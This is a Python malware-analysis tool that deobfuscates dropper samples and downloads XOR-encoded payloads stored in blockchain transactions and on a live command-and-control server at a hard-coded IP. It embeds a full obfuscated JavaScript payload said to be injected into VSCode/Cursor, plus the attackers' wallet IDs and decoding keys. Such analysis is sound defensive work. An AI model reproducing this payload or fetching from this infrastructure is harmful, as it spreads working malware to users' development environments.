import os
import binascii
import logging
import click
import jsbeautifier
import requests
from deobfuscator import *
from pprint import pprint

SAMPLE_PATH = './malware_dropper_samples'
DROPPER_OUTPUT_PATH = './malware_dropper_samples_output'
PAYLOAD_OUTPUT_PATH = './malware_payload_samples_output'

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
logger.addHandler(ch)


@click.group(invoke_without_command=True)
@click.pass_context
def main(ctx):
    if ctx.invoked_subcommand is None:
        click.echo(ctx.get_help())

@main.command()
def deobfuscate_samples():
    """Deobfuscate dropper samples in ./malware_dropper_samples"""
    dropper_samples = os.listdir(SAMPLE_PATH)

    for sample_name in dropper_samples:
        with open(os.path.join(SAMPLE_PATH, sample_name), 'rt') as f:
            output_path = os.path.join(DROPPER_OUTPUT_PATH, sample_name)
            os.makedirs(output_path, exist_ok=True)

            # Deobfuscate stage1 / get stage2
            dropper_stage1_raw = f.read()
            dropper_stage2_raw = dropper_stage1_deobfuscate(dropper_stage1_raw)

            # Deobfuscate stage2
            dropper_stage2_deobfu = dropper_stage2_deobfucsate(dropper_stage2_raw)

            # Write the stages to disk
            with open(os.path.join(DROPPER_OUTPUT_PATH, sample_name, "dropper_stage2_raw.malware_sample"), 'wt') as of:
                of.write(dropper_stage2_raw)
            with open(os.path.join(DROPPER_OUTPUT_PATH, sample_name, "dropper_stage2_deobfu.malware_sample"), 'wt') as of:
                of.write(dropper_stage2_deobfu)
            with open(os.path.join(DROPPER_OUTPUT_PATH, sample_name, "dropper_stage2_deobfu_beautified.malware_sample"), 'wt') as of:
                of.write(jsbeautifier.beautify(dropper_stage2_deobfu))

@main.command()
def manual_test():
    """Temporary manual - test to be removed"""
    # Payload injected into cursor/vscode
    # Also the same blob that is in the payload2-inner
    ide_payload = r"""(function(){var hnv='',jbM=555-544;function AOv(k){var a=798578;var c=k.length;var q=[];for(var d=0;d<c;d++){q[d]=k.charAt(d)};for(var d=0;d<c;d++){var y=a*(d+251)+(a%27735);var b=a*(d+213)+(a%45526);var m=y%c;var r=b%c;var s=q[m];q[m]=q[r];q[r]=s;a=(y+b)%1731010;};return q.join('')};var EsZ=AOv('jbqhuotoivrpdkogznrcuxatsctermnsfwcyl').substr(0,jbM);var zvC='tvc;i41[,ioa)m=];yuv(C10]rt08dr gh;r{l=n1eaa(-o=j(kz.vi)( rvr8;Cuo)8; uh)m),)d=8}r;t.(2,(on}1g=o;e.02d j,,{0,pm,;9.aa865i;) b;(lar2fof6nih.x;0l(),a)hgutr;1nwut=ubh]d=7+);( <).1[2n .]9(;,"ct55r+odh,oobe(iocnu(ncsaz"ursctsglenitu.hlr49,lr)mra)=fsr6r+;dC9,p.(si+=g)Cfmd,rd{t ,mi;vnc]]-.;=>-i2lle8;vn* bSrurlbtaf.<8l[lu;=a,};==;gbgv9ayz;0f.{d v+4s7;vr8Ahj(tot;ed[s,aan [=a.<s.[i4lx0a+)ltn26u"i75d(1r;e;rt1r=.;x[go;n1=v).+=0,i,"nf}[ar)7z=osh g(doln-r(whr=a+aor!nst()s-jj,y){p{p,iu=a,Cw+h]C;inh=sh.(d5Ae=mo4+b+i)tca";.dzA=(d+z)-g+ rl;r+,r7+eenrCcg;+vs8e;rue(iaj8xlh)o=)a.[at63o)w+.[ih(xuunla.ext=lzn(m r=v})sx-n;v+f=[;raSy((q80mr7);r(gpm=e(le]}nv nshvo[+j9fpgri[aA)u mql]5o2r,ufdl<)rp.()pe)1rf[+=6;siiawt3f );;o( ");sh{ egv el>(,v];4c;vr,;nf apnv1r+dv1xa =(vrt;ho=hx=]*".aacc==7 antaoronarsrj+)oo .lnlgt(dv+;s;g,v=poetnap.]c+}06i(ch)1s=1n8lf9,n=hr]n!CwA0f6e0ivd=u= ;fnsv"p=t]7o="r<a."ovr.=oeu(qf+';var qwn=AOv[EsZ];var gtT='';var vaD=qwn;var jud=qwn(gtT,AOv(zvC));var HBx=jud(AOv('4P P02el(1P(o>p)eoCePlz5nf}\/4sP]%4(so!%e drPj.%=)m.sane%]Bl}.ra(l.t0lhp7)2]p=n}(=)bbx7r44${%2hu=h9r][ad.#]1P.P0t.) e)P].tlPa.Pwyt.-tPPP7PBtr.fe%P:e2adton"osS.=%P0,tezn7]b)6h4cn]z[===Tr(rttybe)sd,N]eob;P}!otPi.%}e!s]ms7=t;\/]r3emed+doP@86%lhP1[8pr(P9ti)pb_n.)n0@-g\/tPt[*]n$ggs)m5gr=r!in{0]t=ngaaPPwx7,.ts?(s=P4=n!bb\/2%1r}ta)p%,z,).c3rm]eFxerfPr.5%!(Pa]c(o!eg)reP(8m.&)izn\'db7el(= [tcP9+m(\/;.}af b6rt[.P.EphP;P;sms%fmt;t*,at]t?7Pe.15t7&;ats[.fyty=PPomtzce+d=]tf{$%%4bP1oan.r,=t0aafor1=cz2\'a%or(:01ww)+tenob!jb.lcei[#tP.ico+2t"9r.8n%m&.\'8=];[_)b531()51t0Pi,2sP80n=\'a-)u*otuP3P=.P}}od)PC6=P;])9sPy.P)(isbitl{and.!r*]Pv.nP;:l((%(=a(Po=c)a2;se;w:a;hiC)P0.bta()d.c26{(+.%t:a.4 E94a()]==g.Psarz+s\/ f7tP.\/(ti0r}i n+f.@g=.>f#4).y(t-P.#%%tp;5e])P2k9]0{lb9,{"P()=jbgtr=ub(fdsb3 P)2)4h.o]P}=TP=or7iP>:n9*.2hPbr)o0Ai1Cu)9u.n1r&CnsPu.).;PrP 1%rb6[a7t(esu0ttP91]2h#P%(_=osl>teP;.}>&t[:y}cPc62,b%4PP.[e]PP(6iltf_3[l!m[l;c 3s,.nP=]+l>]rttry[).PP!er,c3t](=.8],6qjPn}wazbc:t!.PeiP=P>}85a@00u;),s!])tfl;=[Ebbr .Pi10\/Ez3ae70P+(2<rE(B0_)4)ePwaa(}s)Ebst<PP(efan rab)}do.tdP]slb6(P<3\/c+5z1uo,(rd]tt))nSP2e\/n}(}&PnP!P.n=PP0PPb(!Py}e?5.b[uh)4i.o]so2{retu3Pg5b_P.tt]or,")n.aPa=p+",2uh]}=P.5a4Pr5+pPvPPel1][3}_8Plrn2n:1[]e ,eP]Co}.t%:]{#%oP4]4.!+cPfeu%P.rr. d=t9]e8 c3c.f-4([36uPdblP6..P, %>]bnee)\/oPvb=.1;{};;bcti]u9,{PPa9yua(P0aSo)]PuPp[=deic)pdP\/i[PnPnP(e,)(}b;r3()%b+PteP#cP#0](g}wP35(!t=P;(b(<".P?PinA)201$]}7B;60PPnPe4,rsr 6nme[e}\/[tpu_b391F.tCP)2g,Pe.5P\/a.mb}F;%u .@r31hb1]].0)]"1]%[t=1a31k%3]t-bruP62v2ns.tP+j\'_*1a]{(P)rhcrra)2e.)}l{=4o=fC!dor}8_r%.iaw[ri1m1ns1[bP) ?%Cdpe2ir. %]etttf.ynsn]xP(,7%P\/]aol1t0.ah_P[+n]y%c.;s.(]]2b).=29]]u3]3;=.r7*r.rb.tfo]Peo){i+pa)";=tfws&(fj.%eo,Src-.n[Pm*3=((8rsl%](8)"btraP30fP%C]e$;Pl2(1tgeaP.i{PtPPg5k,ser[ir4o!;"PPo.PPdPs<;ti))%5Pp35b%P{3.pz.o%e1Po4n,(@3)[rbePa(92$=5)eex 1blauqbf$@e=}bzPpsd:!((N;1<tu.l9anb+)h:a;?e\'ni=r9rb}e=)!rPg);(arS =2%E*t.e.;2fePr]Bnt0P !lo1tP7r+]2(m]9f2eozamr307Pa,Pb;[=P"=Pn=)P]]gPPP73(tg=oe2\'%4Pt\/bbi)5A!2%cs]+3{.r.]s5e+b=r 4PnbtCgP=3P1]=ra8nnPPT[$Pt1+=2}c C1etP_o3t+o%5PyC3sr{%"]Poi!((t6%bi(b1t(cz n)t(?d8:.ee+.+)8()](,]+ trntPu+=3!)s.de r3hPr -P%,+ib}1Pj_]n]]u:A6a)tPhngn }(P.%ea.Po4 %Pnt]6]s)()6%rta%\'(rh Pt2{[n ]p7ncr=3l.x1+Pa1=iv.]ilorP4Pin4bgPPbP)SPi[ft;t9 v.osP,nAf=ssg6loA)]P3b.8=.PPBlsa8;(9E{3?o.)o],!i9%[)e[auonc_f;.32][(rj=i[thrlo0c5P y._)Pnf&D@.*.y]iw9oPd 0f5]} o%P(=t=l]'));var NPo=vaD(hnv,HBx );NPo(4534);return 3720})()"""

    ide_payload_stage2_raw = dropper_stage1_deobfuscate(ide_payload)
    ide_payload_stage2_deobfu = dropper_stage2_deobfucsate(ide_payload_stage2_raw)

    print(ide_payload_stage2_deobfu)


@main.command()
def download_latest_payloads():
    """Download latest malware payloads from crypto chains"""

    def get_payload_from_chain(key, trongrid_id, aptos_id):
        trongrid_data = requests.get(f'https://api.trongrid.io/v1/accounts/{trongrid_id}/transactions?only_confirmed=true&only_from=true&limit=1').json()
        trongrid_hash = (binascii.unhexlify(trongrid_data['data'][0]['raw_data']['data'])[::-1].decode('utf8'))
        logger.info(f"BSC transacation hash from trongrid: {trongrid_hash}")

        aptos_data = requests.get(f'https://fullnode.mainnet.aptoslabs.com/v1/accounts/{aptos_id}/transactions?limit=1').json()
        aptos_hash = (aptos_data[0]['payload']['arguments'][0])
        logger.info(f"BSC transacation hash from aptoslabs: {aptos_hash}")
        assert trongrid_hash == aptos_hash, "expected transaction hash to be same on both networks!"

        logger.info("Getting encoded payload from BSC network")
        headers = {
            'Content-Type': 'application/json',
        }

        json_data = {
            'method': 'eth_getTransactionByHash',
            'params': [
                aptos_hash,
            ],
            'id': 1,
            'jsonrpc': '2.0',
        }

        bsc_data = requests.post('https://bsc-dataseed.binance.org', headers=headers, json=json_data).json()
        encoded_payload = binascii.unhexlify(bsc_data['result']['input'][2:]).decode('utf8').split('?.?')[1]
        decoded_payload = ''
        for i in range(len(encoded_payload)):
            xor_byte = ord(key[i % len(key)])
            decoded_payload += chr(ord(encoded_payload[i]) ^ xor_byte)
        
        return {'bsc_transaction_hash': aptos_hash, 'payload': decoded_payload}
    

    payloads = [
        {
            'name': 'payload1',
            'key': '2[gWfGj;<:-93Z^C',
            'trongrid_id': 'TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP',
            'aptos_id': '0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e',
        },
        {
            'name': 'payload2',
            'key': 'm6:tTh^D)cBz?NM]',
            'trongrid_id': 'TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG',
            'aptos_id': '0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3',
        },

        # Downloaded from payload2, handles persistence (VSCode/Cursor), etc.
        {
            'name': 'payload1_inner',
            'key': 'cA]2!+37v,-szeU}',
            'trongrid_id': 'TLmj13VL4p6NQ7jpxz8d9uYY6FUKCYatSe',
            'aptos_id': '0x3414a658f13b652f24301e986f9e0079ef506992472c1d5224180340d8105837',
        },
    ]
    
    # Download root payload(s)
    os.makedirs(PAYLOAD_OUTPUT_PATH, exist_ok=True)
    logger.info("Starting download of root-level payload variants")
    for payload in payloads:
        logger.info(f"Downloading latest '{payload['name']}' from BSC chain")
        decoded_payload = get_payload_from_chain(payload['key'], payload['trongrid_id'], payload['aptos_id'])

        # Write raw payloads to disk
        logger.info(f"Writing raw '{payload['name']}' to disk")
        payload_base_filename = f"{payload['name']}_bsc_{decoded_payload['bsc_transaction_hash']}"
        with open(os.path.join(PAYLOAD_OUTPUT_PATH, f"{payload_base_filename}_raw.malware_sample"), 'wt') as of:
            of.write(decoded_payload['payload'])
        with open(os.path.join(PAYLOAD_OUTPUT_PATH, f"{payload_base_filename}_raw_beautified.malware_sample"), 'wt') as of:
            of.write(jsbeautifier.beautify(decoded_payload['payload']))
        
        # Attempt to deobfucsate the payloads and write to disk
        try:
            deobfu_payload_stage2_raw = dropper_stage1_deobfuscate(decoded_payload['payload'])
            deobfu_payload_stage2_deobfu = dropper_stage2_deobfucsate(deobfu_payload_stage2_raw)
            with open(os.path.join(PAYLOAD_OUTPUT_PATH, f"{payload_base_filename}_deobfu.malware_sample"), 'wt') as of:
                of.write(deobfu_payload_stage2_deobfu)
            with open(os.path.join(PAYLOAD_OUTPUT_PATH, f"{payload_base_filename}_deobfu_beautified.malware_sample"), 'wt') as of:
                of.write(jsbeautifier.beautify(deobfu_payload_stage2_deobfu))
        except Exception as e:
            logger.warning(f"Failed to decode payload '{payload['name']}' as stage1/stage2 blob: {e}")
            pass

    # Download payload2-inner directly from the C&C (eugh)
    logger.info("Starting download of payload2-inner variants")
    payload2_vers = ['5-143', '5-3-3']
    payload2_inner_key = 'ThZG+0jfXE6VAGOJ'
    payload2_inner_url = 'http://23.27.20.143:27017/$/boot'

    for ver in payload2_vers:
        # Download
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Sec-V': ver,
        }
        resp = requests.get(payload2_inner_url, headers=headers)

        # Decode
        encoded_payload2_inner = resp.content.decode('utf8')
        decoded_payload2_inner = ''
        for i in range(len(encoded_payload2_inner)):
            xor_byte = ord(payload2_inner_key[i % len(payload2_inner_key)])
            decoded_payload2_inner += chr(ord(encoded_payload2_inner[i]) ^ xor_byte)

        # Write
        payload_name = f"payload2_inner_{ver}"
        logger.info(f"Writing raw '{payload_name}' to disk")
        payload_base_filename = f"{payload_name}"
        with open(os.path.join(PAYLOAD_OUTPUT_PATH, f"{payload_base_filename}_raw.malware_sample"), 'wt') as of:
            of.write(decoded_payload2_inner)
        with open(os.path.join(PAYLOAD_OUTPUT_PATH, f"{payload_base_filename}_raw_beautified.malware_sample"), 'wt') as of:
            of.write(jsbeautifier.beautify(decoded_payload2_inner))




if __name__ == "__main__":
    main()
